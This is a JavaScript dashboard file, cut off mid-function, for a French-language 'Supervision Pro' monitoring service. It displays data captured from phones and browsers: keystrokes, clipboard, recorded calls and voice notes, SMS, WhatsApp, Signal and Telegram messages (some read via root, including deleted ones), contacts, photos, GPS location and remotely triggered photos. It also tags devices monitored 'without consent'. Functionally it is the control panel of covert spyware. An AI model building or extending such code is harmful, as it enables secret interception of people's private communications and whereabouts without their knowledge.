/**
 * Supervision Pro – Dashboard Entreprise
 */
const API = '';
let token = localStorage.getItem('sp_token');
let allDevices = [], allEvents = [], ws = null, leafletMap = null, charts = {}, deviceScores = {};

// ─── AUTH (Coffre-fort) ───
let sessionTimeoutMinutes = 60;
let inactivityTimer = null;
let pendingLoginUser = '';
let pendingLoginPass = '';

function doLogin() {
  const u = document.getElementById('login-user').value;
  const p = document.getElementById('login-pass').value;
  const errEl = document.getElementById('login-error');
  errEl.style.display = 'none';
  fetch(`${API}/api/auth/login`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u,password:p}) })
    .then(r=>r.json()).then(d=>{
      if(d.token){
        token=d.token;localStorage.setItem('sp_token',token);
        sessionTimeoutMinutes=d.sessionTimeout||60;
        showApp();
      } else if(d.requires2FA){
        // Montrer l'écran 2FA
        pendingLoginUser=u;pendingLoginPass=p;
        document.getElementById('login-2fa').style.display='block';
        document.getElementById('login-totp').focus();
      } else {
        errEl.textContent=d.error||'Erreur';errEl.style.display='block';
      }
    }).catch(()=>{errEl.textContent='Serveur injoignable';errEl.style.display='block';});
}

function doLogin2FA(){
  const code=document.getElementById('login-totp').value.trim();
  const errEl=document.getElementById('login-error');
  errEl.style.display='none';
  if(!code||code.length!==6){errEl.textContent='Entrez un code à 6 chiffres';errEl.style.display='block';return;}
  fetch(`${API}/api/auth/login`,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:pendingLoginUser,password:pendingLoginPass,totpCode:code})})
    .then(r=>r.json()).then(d=>{
      if(d.token){
        token=d.token;localStorage.setItem('sp_token',token);
        sessionTimeoutMinutes=d.sessionTimeout||60;
        showApp();
      }else{
        errEl.textContent=d.error||'Code invalide';errEl.style.display='block';
        document.getElementById('login-totp').value='';document.getElementById('login-totp').focus();
      }
    }).catch(()=>{errEl.textContent='Erreur réseau';errEl.style.display='block';});
}

function logout(){token=null;localStorage.removeItem('sp_token');clearInactivityTimer();location.reload();}
function authHeaders(){return{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'};}
function showApp(){document.getElementById('login-screen').style.display='none';document.getElementById('app').style.display='flex';initWS();loadAll();startInactivityTimer();}

// ─── Auto-logout par inactivité ───
function startInactivityTimer(){
  clearInactivityTimer();
  const timeoutMs=sessionTimeoutMinutes*60*1000;
  inactivityTimer=setTimeout(()=>{
    alert('Session expirée par inactivité. Reconnexion requise.');
    logout();
  },timeoutMs);
  // Reset sur activité utilisateur
  ['click','keydown','mousemove','scroll','touchstart'].forEach(evt=>{
    document.addEventListener(evt,resetInactivityTimer,{once:true,passive:true});
  });
}
function resetInactivityTimer(){
  if(inactivityTimer){startInactivityTimer();}
}
function clearInactivityTimer(){
  if(inactivityTimer){clearTimeout(inactivityTimer);inactivityTimer=null;}
}

// ─── INIT ───
if(token){fetch(`${API}/api/stats`,{headers:authHeaders()}).then(r=>{if(r.ok)showApp();else{token=null;localStorage.removeItem('sp_token');}}).catch(()=>{});}

// ─── WEBSOCKET ───
function initWS(){
  const proto=location.protocol==='https:'?'wss':'ws';
  ws=new WebSocket(`${proto}://${location.host}/ws?token=${encodeURIComponent(token)}`);
  ws.onopen=()=>{document.getElementById('ws-status').innerHTML='🟢 Temps réel actif';};
  ws.onclose=()=>{document.getElementById('ws-status').innerHTML='🔴 Déconnecté';setTimeout(initWS,3000);};
  ws.onmessage=(e)=>{
    const d=JSON.parse(e.data);
    if(d.type==='new_event'){allEvents.unshift(d.event);renderOverview();renderEventsPage();}
    if(d.type==='batch_events'&&d.events){d.events.forEach(ev=>allEvents.unshift(ev));renderOverview();renderEventsPage();}
    if(d.type==='alert'){loadAlerts();const b=document.getElementById('alert-badge');b.style.display='inline';b.textContent=parseInt(b.textContent||0)+1;}
    if(d.type==='watchdog'){loadAlerts();}
    if(d.type==='new_photo'){onNewPhotoReceived(d.photo);}
    if(d.type==='command_ack'&&d.command?.type==='take_photo'){
      const btn=document.getElementById('btn-take-photo');
      if(btn){btn.classList.remove('btn-taking-photo');btn.textContent='📷 Prendre une photo';}
    }
  };
}

// ─── FETCH ───
async function fetchJ(url){const r=await fetch(`${API}${url}`,{headers:authHeaders()});if(!r.ok)throw new Error(r.status);return r.json();}

// ─── UTILS ───
function esc(s){if(s==null)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
function fmtTime(iso){return new Date(iso).toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});}
function shortTime(iso){return new Date(iso).toLocaleString('fr-FR',{hour:'2-digit',minute:'2-digit'});}
function isLastHour(iso){return(Date.now()-new Date(iso).getTime())<3600000;}
function deviceName(id){const d=allDevices.find(x=>x.deviceId===id);return d?d.deviceName:id.slice(0,8)+'…';}
function isPrivate(e){return e.payload?.private===true;}

const TYPE_LABELS={
  heartbeat:'Heartbeat',browser:'Nav. intégré',device_info:'Infos appareil',
  app_opened:'App ouverte',app_closed:'App fermée',app_focus:'App active',
  apps_installed:'Apps installées',app_usage:'Usage apps',
  safari_page:'Safari Page',safari_search:'Safari Recherche',safari_form:'Safari Form',safari_text:'Safari Texte',
  chrome_page:'Chrome Page',chrome_search:'Chrome Recherche',chrome_form:'Chrome Form',chrome_text:'Chrome Texte',
  chrome_download:'Téléchargement',
  network_traffic:'Trafic réseau',location:'📍 GPS',app_installed:'App installée',app_removed:'App supprimée',
  photo_captured:'📷 Photo capturée',take_photo:'Photo demandée',
  notification_message:'💬 Message',
  voice_message:'🎤 Vocal',
  voice_note_captured:'🎤 Vocal capturé',
  call_recording:'🔴 Appel enregistré',
  root_message:'🔓 Message (root)',
  sms_message:'📱 SMS',
  contacts_sync:'👥 Contacts',
  new_photo_detected:'📷 Nouvelle photo',
  new_video_detected:'🎬 Nouvelle vidéo',
  screenshot:'📸 Screenshot',
  whatsapp_contacts:'👥 Contacts WhatsApp',
  whatsapp_media_files:'📁 Média WhatsApp',
  root_device_info:'🔓 Infos root',
  keystroke:'⌨️ Texte tapé',
  clipboard:'📋 Presse-papiers',
  phone_call:'📞 Appel',
  device_boot:'🔄 Redémarrage',
};

const PACKAGE_NAMES={
  'com.whatsapp':'WhatsApp','com.whatsapp.w4b':'WhatsApp Business',
  'org.telegram.messenger':'Telegram','com.facebook.orca':'Messenger',
  'com.instagram.android':'Instagram','com.snapchat.android':'Snapchat',
  'org.thoughtcrime.securesms':'Signal','com.google.android.apps.messaging':'Messages',
  'com.samsung.android.messaging':'Samsung Messages','com.android.mms':'SMS',
  'com.slack':'Slack','com.microsoft.teams':'Teams','com.discord':'Discord',
  'com.skype.raider':'Skype','com.viber.voip':'Viber',
  'com.openai.chatgpt':'ChatGPT','com.google.android.apps.bard':'Gemini',
  'com.anthropic.claude':'Claude','com.tencent.mm':'WeChat',
  'jp.naver.line.android':'Line','com.imo.android.imoim':'Imo',
  'com.google.android.gm':'Gmail','com.microsoft.office.outlook':'Outlook',
  'com.google.android.youtube':'YouTube','com.android.chrome':'Chrome',
  'com.google.android.dialer':'Téléphone','com.google.android.contacts':'Contacts',
  'com.google.android.apps.photos':'Google Photos','com.android.settings':'Paramètres',
  'com.google.android.apps.maps':'Google Maps','com.google.android.calendar':'Agenda',
};
function readableAppName(pkg){return PACKAGE_NAMES[pkg]||pkg?.split('.').pop()||pkg||'App';}

const SOURCE_LABELS={auto:'Auto-capturée',command:'Demandée',gallery:'Galerie'};
const APP_LABELS={whatsapp:'WhatsApp',telegram:'Telegram',signal:'Signal',snapchat:'Snapchat',
  instagram:'Instagram',messenger:'Messenger',camera:'Appareil photo',other:'Autre app'};
const APP_ICONS={whatsapp:'💬',telegram:'✈️',signal:'🔒',snapchat:'👻',instagram:'📸',messenger:'💬',camera:'📷',other:'📱'};

function eventDetail(e){
  const p=e.payload||{};
  if(e.type==='browser'&&p.url)return`<a href="${esc(p.url)}" target="_blank">${esc(p.url)}</a>`;
  if(e.type==='device_info'){const a=[];if(p.model)a.push(p.model);if(p.manufacturer)a.push(p.manufacturer);if(p.system)a.push(p.system);if(p.batteryLevel!=null)a.push(`Bat ${p.batteryLevel}%`);return esc(a.join(' · '));}
  if(e.type==='heartbeat'){const a=[];if(p.batteryLevel!=null)a.push(`Bat ${p.batteryLevel}%`);if(p.batteryState)a.push(p.batteryState);if(p.storageFreeGB)a.push(Number(p.storageFreeGB).toFixed(1)+' Go libre');return esc(a.join(' · '));}
  if(e.type==='app_closed'&&p.sessionDurationSeconds!=null)return esc(`Session ${Math.floor(p.sessionDurationSeconds/60)}min`);
  if(e.type==='location'&&p.latitude)return esc(`${Number(p.latitude).toFixed(5)}, ${Number(p.longitude).toFixed(5)}`)+(p.accuracy?` <span style="color:var(--text-dim)">(±${Math.round(p.accuracy)}m)</span>`:'');
  if(e.type==='network_traffic')return`<strong>${esc(p.app||p.bundleId||'')}</strong> → ${esc(p.host||'')}`;
  if(['safari_page','chrome_page'].includes(e.type))return`${esc(p.title?p.title+' – ':'')}<a href="${esc(p.url)}" target="_blank">${esc(p.url)}</a>`;
  if(['safari_search','chrome_search'].includes(e.type))return esc(`"${p.query}" sur ${p.engine||'?'}`);
  if(['safari_form','chrome_form'].includes(e.type)){const f=p.fields||{};return esc(Object.entries(f).map(([k,v])=>`${k}:"${v}"`).join(', '));}
  if(['safari_text','chrome_text'].includes(e.type))return esc(`"${p.text}" (${p.fieldName||'champ'})`);
  if(e.type==='chrome_download')return`📥 <a href="${esc(p.url)}" target="_blank">${esc(p.filename||p.url)}</a> ${p.mimeType?'('+esc(p.mimeType)+')':''}`;
  // Android : notifications (WhatsApp, SMS, Telegram, etc.)
  if(e.type==='notification_message'){
    const appIcon=APP_ICONS[p.app?.toLowerCase()]||'💬';
    const appLabel=esc(p.app||readableAppName(p.packageName));
    return`${appIcon} <strong>${appLabel}</strong> — ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,200))}"</em>`;
  }
  // Android : messages vocaux
  if(e.type==='voice_message'){
    const appIcon=APP_ICONS[p.app?.toLowerCase()]||'🎤';
    const appLabel=esc(p.app||readableAppName(p.packageName));
    return`🎤 <strong>${appLabel}</strong> — ${esc(p.sender||'')}: <em style="color:#f59e0b">Message vocal</em>`;
  }
  // Android : texte tapé au clavier
  if(e.type==='keystroke'){
    const appName=esc(readableAppName(p.app));
    return`⌨️ <strong>${appName}</strong> — <em>"${esc((p.text||'').slice(0,300))}"</em>`;
  }
  // Android : app active
  if(e.type==='app_focus')return`📱 ${esc(readableAppName(p.app))}`;
  // Android : apps installées
  if(e.type==='apps_installed')return`${p.count||0} apps installées`;
  // Appels téléphoniques
  if(e.type==='phone_call'){
    const typeIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
    const icon=typeIcons[p.type]||'📞';
    const dur=p.durationMinutes>0?` (${p.durationMinutes} min)`:(p.durationSeconds>0?` (${p.durationSeconds}s)`:'');
    const name=p.contact?`<strong>${esc(p.contact)}</strong> — `:'';
    return`${icon} ${esc(p.type||'')} — ${name}${esc(p.number||'inconnu')}${dur}`;
  }
  if(e.type==='device_boot')return'Appareil redémarré';
  if(e.type==='voice_note_captured'){
    const dur=p.durationSeconds||p.durationEstimate||'?';
    const appName=esc(p.app||'');
    const player=p.audioId?`<audio controls preload="none" src="/api/audio/${p.audioId}/stream" style="height:28px;vertical-align:middle;margin-left:6px"></audio>`:'';
    return`🎤 <strong>${appName}</strong> — ${esc(p.sender||'')} — Vocal ${dur}s ${p.isOutgoing?'(envoyé)':'(reçu)'}${player}`;
  }
  if(e.type==='call_recording'){
    const dur=p.durationSeconds||'?';
    const player=p.audioId?`<audio controls preload="none" src="/api/audio/${p.audioId}/stream" style="height:28px;vertical-align:middle;margin-left:6px"></audio>`:'';
    return`🔴 <strong>Appel enregistré</strong> — ${esc(p.number||'')} — ${dur}s ${p.isOutgoing?'(sortant)':'(entrant)'}${player}`;
  }
  if(e.type==='root_message'){
    const dir=p.isOutgoing?'→':'←';
    const del=p.isDeleted?' <span style="color:var(--danger)">[supprimé]</span>':'';
    const fwd=p.isForwarded?' <span style="color:var(--text-dim)">[transféré]</span>':'';
    return`🔓 <strong>${esc(p.app||'')}</strong> ${dir} ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,300))}"</em>${del}${fwd}`;
  }
  if(e.type==='sms_message'){
    return`📱 <strong>SMS ${esc(p.type||'')}</strong> — ${esc(p.contact||p.address||'')}: <em>"${esc((p.body||'').slice(0,200))}"</em>`;
  }
  if(e.type==='contacts_sync')return`👥 ${p.count||0} contacts synchronisés`;
  if(e.type==='new_photo_detected'){
    const src=p.sourceApp||'galerie';
    return`📷 Nouvelle photo : <strong>${esc(p.filename||'')}</strong> (${src}) ${p.isScreenshot?'— Screenshot':''}`;
  }
  if(e.type==='new_video_detected')return`🎬 Nouvelle vidéo : <strong>${esc(p.filename||'')}</strong> (${p.sizeMB||'?'} Mo, ${p.durationSeconds||'?'}s)`;
  // Clipboard
  if(e.type==='clipboard')return`📋 <em>"${esc((p.text||'').slice(0,200))}"</em> (${p.length||0} car.)`;
  // Photo
  if(e.type==='photo_captured'){
    const src=SOURCE_LABELS[p.source]||p.source||'Auto';
    const appName=APP_LABELS[p.sourceApp]||p.sourceApp||'';
    const icon=APP_ICONS[p.sourceApp]||'📷';
    const size=p.sizeBytes>1048576?(p.sizeBytes/1048576).toFixed(1)+' Mo':(p.sizeBytes/1024).toFixed(0)+' Ko';
    return`${icon} <strong>${esc(appName||src)}</strong>${appName?' – '+esc(src):''} (${size})`;
  }
  if(Object.keys(p).length)return esc(JSON.stringify(p));return'';
}

// ─── NAV ───
function showPage(name){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  const pg=document.getElementById(`page-${name}`);if(pg)pg.classList.add('active');
  const nv=document.querySelector(`.nav-item[data-page="${name}"]`);if(nv)nv.classList.add('active');
  if(name==='map')initMap();
  if(name==='charts')renderCharts();
  if(name==='alerts')loadAlerts();
  if(name==='messages')renderMessagesPage();
  if(name==='keywords')loadKeywords();
  if(name==='photos')loadPhotosPage();
  if(name==='security')loadSecurityPage();
  if(name==='compliance')loadCompliancePage();
}
document.querySelectorAll('.nav-item[data-page]').forEach(i=>i.addEventListener('click',(e)=>{e.preventDefault();showPage(i.dataset.page);}));

// ─── LOAD ───
async function loadAll(){
  try{
    const[devs,evts,stats]=await Promise.all([fetchJ('/api/devices'),fetchJ('/api/events?limit=500'),fetchJ('/api/stats')]);
    allDevices=devs;allEvents=evts;
    document.getElementById('stat-devices').textContent=stats.totalDevices;
    document.getElementById('stat-online').textContent=stats.onlineDevices;
    document.getElementById('stat-events-today').textContent=stats.eventsToday;
    document.getElementById('stat-urls-today').textContent=stats.urlsToday;
    document.getElementById('stat-photos').textContent=stats.photosToday||0;
    document.getElementById('stat-alerts').textContent=stats.unseenAlerts;
    if(stats.unseenAlerts>0){const b=document.getElementById('alert-badge');b.style.display='inline';b.textContent=stats.unseenAlerts;}
    if(stats.deviceScores)deviceScores=stats.deviceScores;
    renderOverview();renderDevicesPage();renderBrowsingPage();renderEventsPage();fillDeviceFilters();
    document.getElementById('last-update').textContent='MAJ '+new Date().toLocaleTimeString('fr-FR');
  }catch(err){console.error(err);}
}

// ─── RENDER EVENTS LIST ───
function renderEventsList(el,events,showDev){
  if(!events.length){el.innerHTML='<p class="empty">Aucun événement.</p>';return;}
  el.innerHTML=events.map(e=>{
    const lbl=TYPE_LABELS[e.type]||e.type;const det=eventDetail(e);const priv=isPrivate(e);
    return`<div class="event-row${priv?' private-mode':''}"><span class="event-badge ${esc(e.type)}">${esc(lbl)}</span>${priv?'<span class="private-tag">PRIVÉ</span>':''}
    <div class="event-content">${det?`<div class="event-detail">${det}</div>`:''}${showDev?`<span class="event-device-tag">${esc(deviceName(e.deviceId))}</span>`:''}</div>
    <span class="event-time">${fmtTime(e.receivedAt)}</span></div>`;}).join('');
}

// ─── OVERVIEW ───
function renderOverview(){
  const online=new Set();allEvents.filter(e=>isLastHour(e.receivedAt)).forEach(e=>online.add(e.deviceId));
  const devEl=document.getElementById('overview-devices');
  devEl.innerHTML=allDevices.length?allDevices.slice(0,5).map(d=>`<div class="event-row" style="cursor:pointer" onclick="showDeviceDetail('${esc(d.deviceId)}')">
    <span class="status-dot ${online.has(d.deviceId)?'online':'offline'}"></span>
    <div class="event-content"><strong>${esc(d.deviceName)}</strong><div class="event-detail">${fmtTime(d.registeredAt)}</div></div></div>`).join(''):'<p class="empty">Aucun appareil.</p>';
  renderEventsList(document.getElementById('overview-events'),allEvents.slice(0,15),true);
}

// ─── DEVICES ───
function riskScoreBadge(deviceId){
  const ds=deviceScores[deviceId];
  if(!ds)return'';
  const s=ds.riskScore||0;
  const cls=s>=50?'risk-high':s>=20?'risk-medium':'risk-low';
  return`<span class="risk-score ${cls}" title="Score de risque">${s}</span>`;
}
function renderDevicesPage(){
  const el=document.getElementById('devices-list');if(!allDevices.length){el.innerHTML='<p class="empty">Aucun.</p>';return;}
  const online=new Set();allEvents.filter(e=>isLastHour(e.receivedAt)).forEach(e=>online.add(e.deviceId));
  el.innerHTML=allDevices.map(d=>{
    const ds=deviceScores[d.deviceId]||{};
    const on=ds.isOnline||online.has(d.deviceId);
    const li=allEvents.find(e=>e.deviceId===d.deviceId&&e.type==='device_info');
    const consentTag=d.consentGiven?'<span style="color:var(--success);font-size:0.65rem;font-weight:600">&#10003; Consentement</span>':'<span style="color:var(--warning);font-size:0.65rem;font-weight:600">&#9888; Sans consentement</span>';
    const batText=ds.batteryLevel!=null?` · Bat ${ds.batteryLevel}%`:'';
    const lastSeenText=ds.lastSeen?` · Vu ${fmtTime(ds.lastSeen)}`:'';
    const isAndroid=d.deviceId?.startsWith('ANDROID')||li?.payload?.system?.includes('Android');
    const platformTag=isAndroid?'<span style="color:#a4c639;font-size:0.6rem;font-weight:600">ANDROID</span>':d.deviceId?.startsWith('CHROME')?'<span style="color:#4285f4;font-size:0.6rem;font-weight:600">CHROME</span>':'<span style="color:#999;font-size:0.6rem;font-weight:600">iOS</span>';
    return`<div class="device-card" onclick="showDeviceDetail('${esc(d.deviceId)}')">
      <div class="device-card-header"><span class="device-card-name">${esc(d.deviceName)}</span><div style="display:flex;align-items:center;gap:6px">${riskScoreBadge(d.deviceId)}<span class="status-dot ${on?'online':'offline'}"></span></div></div>
      <div class="device-card-meta">${platformTag} ${li?.payload?.system?'· '+esc(li.payload.system):''}<br>${consentTag}${esc(batText)}${esc(lastSeenText)}<br>Enregistré ${fmtTime(d.registeredAt)}</div>
      <div class="device-card-id">${esc(d.deviceId)}</div></div>`;}).join('');
}

// ─── BROWSING ───
function renderBrowsingPage(){
  const f=document.getElementById('browsing-device-filter').value;
  let urls=allEvents.filter(e=>['browser','safari_page','safari_search','chrome_page','chrome_search'].includes(e.type));
  if(f)urls=urls.filter(e=>e.deviceId===f);
  const el=document.getElementById('browsing-list');
  if(!urls.length){el.innerHTML='<p class="empty">Aucune URL.</p>';return;}
  el.innerHTML=urls.slice(0,200).map(e=>{const url=e.payload?.url||'–';const src=e.type==='browser'?'App':e.type.startsWith('chrome_')?'Chrome':'Safari';
    const q=(e.type.includes('search')&&e.payload?.query)?` — "${esc(e.payload.query)}"`:''
    const priv=isPrivate(e);
    return`<div class="url-row${priv?' private-mode':''}"><span class="event-badge ${esc(e.type)}" style="min-width:50px;font-size:0.65rem">${esc(src)}</span>${priv?'<span class="private-tag">PRIVÉ</span>':''}
    <a class="url-link" href="${esc(url)}" target="_blank">${esc(url)}</a>${q}<span class="url-device">${esc(deviceName(e.deviceId))}</span><span class="url-time">${fmtTime(e.receivedAt)}</span></div>`;}).join('');
}
document.getElementById('browsing-device-filter').addEventListener('change',renderBrowsingPage);

// ─── EVENTS ───
function renderEventsPage(){
  const df=document.getElementById('events-device-filter').value;const tf=document.getElementById('events-type-filter').value;
  let evts=[...allEvents];if(df)evts=evts.filter(e=>e.deviceId===df);if(tf)evts=evts.filter(e=>e.type===tf);
  renderEventsList(document.getElementById('events-full-list'),evts.slice(0,200),true);
}
document.getElementById('events-device-filter').addEventListener('change',renderEventsPage);
document.getElementById('events-type-filter').addEventListener('change',renderEventsPage);

// ─── DEVICE DETAIL ───
let currentDetailDevice=null;
function showDeviceDetail(deviceId){
  currentDetailDevice=deviceId;showPage('device-detail');
  const device=allDevices.find(d=>d.deviceId===deviceId);const events=allEvents.filter(e=>e.deviceId===deviceId);
  const li=events.find(e=>e.type==='device_info');const lh=events.find(e=>e.type==='heartbeat');const urls=events.filter(e=>['browser','safari_page','chrome_page'].includes(e.type));
  const on=events.some(e=>isLastHour(e.receivedAt));
  document.getElementById('detail-device-name').textContent=device?.deviceName||'Appareil';
  document.getElementById('detail-status').textContent=on?'En ligne':'Hors ligne';document.getElementById('detail-status').style.color=on?'var(--success)':'var(--danger)';
  document.getElementById('detail-battery').textContent=(lh?.payload?.batteryLevel??li?.payload?.batteryLevel??'–')+'%';
  document.getElementById('detail-storage').textContent=li?.payload?.storageFreeGB?li.payload.storageFreeGB+' Go':'–';
  document.getElementById('detail-events-count').textContent=events.length;
  const p=li?.payload||{};
  document.getElementById('detail-info').innerHTML=[['Nom',device?.deviceName],['Modèle',p.model],['Système',p.system],['Batterie',p.batteryLevel!=null?p.batteryLevel+'%':null],['Stockage libre',p.storageFreeGB?p.storageFreeGB+' Go':null],['Enregistré',device?.registeredAt?fmtTime(device.registeredAt):null],['ID',device?.deviceId]].filter(([,v])=>v).map(([k,v])=>`<div class="info-row"><span class="info-label">${esc(k)}</span><span class="info-value">${esc(v)}</span></div>`).join('');
  document.getElementById('detail-browsing').innerHTML=urls.length?urls.slice(0,50).map(e=>{const priv=isPrivate(e);return`<div class="url-row${priv?' private-mode':''}"><a class="url-link" href="${esc(e.payload?.url)}" target="_blank">${esc(e.payload?.url)}</a>${priv?'<span class="private-tag">PRIVÉ</span>':''}<span class="url-time">${shortTime(e.receivedAt)}</span></div>`;}).join(''):'<p class="empty">Aucune.</p>';
  renderEventsList(document.getElementById('detail-events'),events.slice(0,30),false);
  document.getElementById('btn-download-report').onclick=()=>{window.open(`${API}/api/reports/${deviceId}?from=${new Date(Date.now()-7*86400000).toISOString().slice(0,10)}&to=${new Date().toISOString().slice(0,10)}`,`_blank`);};
  // Charger les photos de cet appareil
  loadDevicePhotos(deviceId);
  // Charger la config de sync
  loadSyncConfig(deviceId);
}

// ─── MAP ───
function initMap(){
  if(!leafletMap){leafletMap=L.map('map-container').setView([48.8566,2.3522],5);}
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'OSM'}).addTo(leafletMap);
  fetchJ('/api/locations/latest').then(locs=>{
    leafletMap.eachLayer(l=>{if(l instanceof L.Marker)leafletMap.removeLayer(l);});
    locs.forEach(loc=>{const p=loc.payload;if(p.latitude&&p.longitude){
      L.marker([p.latitude,p.longitude]).addTo(leafletMap).bindPopup(`<b>${esc(deviceName(loc.deviceId))}</b><br>${fmtTime(loc.receivedAt)}<br>Bat: ${p.batteryLevel||'?'}%`);
    }});
    if(locs.length){const b=locs.filter(l=>l.payload.latitude).map(l=>[l.payload.latitude,l.payload.longitude]);if(b.length)leafletMap.fitBounds(b,{padding:[30,30]});}
  }).catch(()=>{});
  setTimeout(()=>leafletMap.invalidateSize(),200);
}

// ─── TIMELINE ───
document.getElementById('timeline-date').valueAsDate=new Date();
document.getElementById('timeline-device').addEventListener('change',loadTimeline);
document.getElementById('timeline-date').addEventListener('change',loadTimeline);
function loadTimeline(){
  const devId=document.getElementById('timeline-device').value;const date=document.getElementById('timeline-date').value;
  if(!devId||!date){document.getElementById('timeline-list').innerHTML='<p class="empty">Sélectionnez un appareil et une date.</p>';return;}
  fetchJ(`/api/timeline/${devId}?date=${date}`).then(events=>{
    const el=document.getElementById('timeline-list');
    if(!events.length){el.innerHTML='<p class="empty">Aucun événement ce jour.</p>';return;}
    let lastHour='';
    el.innerHTML=events.map(e=>{
      e.payload=typeof e.payload==='string'?JSON.parse(e.payload):e.payload;
      const h=new Date(e.receivedAt).getHours();const hStr=`${h}h`;const showH=hStr!==lastHour;lastHour=hStr;
      const lbl=TYPE_LABELS[e.type]||e.type;const det=eventDetail(e);const priv=isPrivate(e);
      return`${showH?`<div class="timeline-hour">${hStr}00</div>`:''}
      <div class="event-row${priv?' private-mode':''}"><span class="event-badge ${esc(e.type)}">${esc(lbl)}</span>${priv?'<span class="private-tag">PRIVÉ</span>':''}
      <div class="event-content">${det?`<div class="event-detail">${det}</div>`:''}</div><span class="event-time">${shortTime(e.receivedAt)}</span></div>`;
    }).join('');
  }).catch(()=>{});
}

// ─── ALERTS ───
async function loadAlerts(){
  const alerts=await fetchJ('/api/alerts');
  const el=document.getElementById('alerts-list');
  if(!alerts.length){el.innerHTML='<p class="empty">Aucune alerte.</p>';return;}
  el.innerHTML=alerts.map(a=>{
    const sev=a.severity||'warning';
    const src=a.source||'keyword';
    const sevIcon={critical:'🔴',warning:'🟡',info:'🔵'}[sev]||'⚪';
    const sevLabel={critical:'CRITIQUE',warning:'ATTENTION',info:'INFO'}[sev]||sev;
    const srcLabel={keyword:'Mot-clé',anomaly:'Anomalie',category:'Catégorie site',watchdog:'Watchdog'}[src]||src;
    const bgColor={critical:'#4a1111',warning:'#3a3a1e',info:'#1e2e3a'}[sev]||'#4a1111';
    const fgColor={critical:'#fca5a5',warning:'#fde047',info:'#93c5fd'}[sev]||'#fca5a5';
    return`<div class="event-row${a.seen?'':' private-mode'}">
      <span class="event-badge" style="background:${bgColor};color:${fgColor};min-width:90px">${sevIcon} ${esc(a.keyword)}</span>
      <div class="event-content">
        <div style="font-size:0.7rem;margin-bottom:2px"><span class="severity-${sev}">${sevLabel}</span> <span class="alert-source-badge source-${src}">${srcLabel}</span></div>
        <div class="event-detail">${esc(a.eventType||'')} ${a.context?'– '+esc(a.context.slice(0,150)):''}</div>
        <span class="event-device-tag">${esc(deviceName(a.deviceId))}</span>
      </div>
      <span class="event-time">${fmtTime(a.createdAt)}</span></div>`;
  }).join('');
}
async function markAlertsSeen(){await fetch(`${API}/api/alerts/mark-seen`,{method:'POST',headers:authHeaders()});loadAlerts();document.getElementById('alert-badge').style.display='none';}

// ─── MESSAGES INTELLIGENT ───

function switchMsgTab(tab){
  document.querySelectorAll('.msg-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.msg-panel').forEach(p=>p.classList.remove('active'));
  document.querySelector(`.msg-tab[data-tab="${tab}"]`)?.classList.add('active');
  document.getElementById(`msg-${tab}`)?.classList.add('active');
}

function renderMessagesPage(){
  const df=document.getElementById('messages-device-filter').value;
  let evts=[...allEvents];
  if(df)evts=evts.filter(e=>e.deviceId===df);
  renderConversations(evts);
  renderTypedTexts(evts);
  renderCallLog(evts);
  renderAppUsage(evts);
  renderClipboardLog(evts);
}

// --- Conversations UNIFIEES par contact/app ---
// Fusionne messages texte, vocaux, appels, médias dans un seul fil chronologique
function renderConversations(evts){
  const relevantTypes=['notification_message','voice_message','voice_note_captured',
    'root_message','phone_call','call_recording','sms_message','new_photo_detected'];
  const msgs=evts.filter(e=>relevantTypes.includes(e.type));
  const el=document.getElementById('conversations-list');
  if(!msgs.length){el.innerHTML='<p class="empty">Aucune conversation captee. Les notifications WhatsApp/SMS apparaitront ici.</p>';return;}

  // Regrouper par contact/numéro (intelligent : même numéro = même conversation)
  const groups={};
  msgs.forEach(m=>{
    const p=m.payload||{};
    const app=p.app||readableAppName(p.packageName);
    const sender=p.sender||p.number||p.address||'Inconnu';
    const group=p.group||p.groupName||'';
    const key=group?`${app}|||${group}`:`${app}|||${sender}`;
    const label=group||p.contact||sender;
    if(!groups[key])groups[key]={app,label,isGroup:!!group,items:[],lastTime:m.receivedAt,senders:new Set()};
    groups[key].senders.add(sender);

    const item={
      type:m.type,
      text:p.message||p.text||p.body||'',
      sender:p.contact||sender,
      time:m.receivedAt,
      device:m.deviceId,
      isOutgoing:!!p.isOutgoing||!!p.key_from_me,
      isVoice:m.type==='voice_message'||m.type==='voice_note_captured'||p.isVoiceMessage,
      isCall:m.type==='phone_call'||m.type==='call_recording',
      isMedia:!!p.isMedia||m.type==='new_photo_detected',
      isDeleted:!!p.isDeleted,
      isForwarded:!!p.isForwarded,
      callType:p.type||'',
      duration:p.durationSeconds||p.durationEstimate||p.mediaDuration||0,
      mediaType:p.mediaType||'',
      audioId:p.audioId||null,
      quotedMessage:p.quotedMessage||null,
      source:p.source||'',
    };
    groups[key].items.push(item);
    if(m.receivedAt>groups[key].lastTime)groups[key].lastTime=m.receivedAt;
  });

  const appIcons={WhatsApp:'💬','WhatsApp Business':'💼',Telegram:'✈️',Messenger:'💬',Instagram:'📸',Signal:'🔒',SMS:'📱',Messages:'📱','Samsung Messages':'📱',Slack:'💼',Teams:'💼',Discord:'🎮',Snapchat:'👻',Viber:'📞',ChatGPT:'🤖',Gemini:'✨',Claude:'🤖'};
  const appColors={WhatsApp:'#25d366','WhatsApp Business':'#25d366',Telegram:'#0088cc',Messenger:'#0084ff',Instagram:'#e1306c',Signal:'#3a76f0',SMS:'#3b82f6',Messages:'#3b82f6',Slack:'#4a154b',Teams:'#6264a7',Discord:'#5865f2',Snapchat:'#fffc00',Viber:'#7360f2',ChatGPT:'#10a37f',Gemini:'#4285f4',Claude:'#d4a574'};

  const sorted=Object.values(groups).sort((a,b)=>new Date(b.lastTime)-new Date(a.lastTime));

  el.innerHTML=sorted.map(g=>{
    const icon=appIcons[g.app]||'💬';
    const color=appColors[g.app]||'#3b82f6';
    const totalItems=g.items.length;
    const lastItem=g.items[g.items.length-1];

    // Aperçu du dernier message
    let lastPreview='';
    if(lastItem.isVoice)lastPreview='🎤 Message vocal';
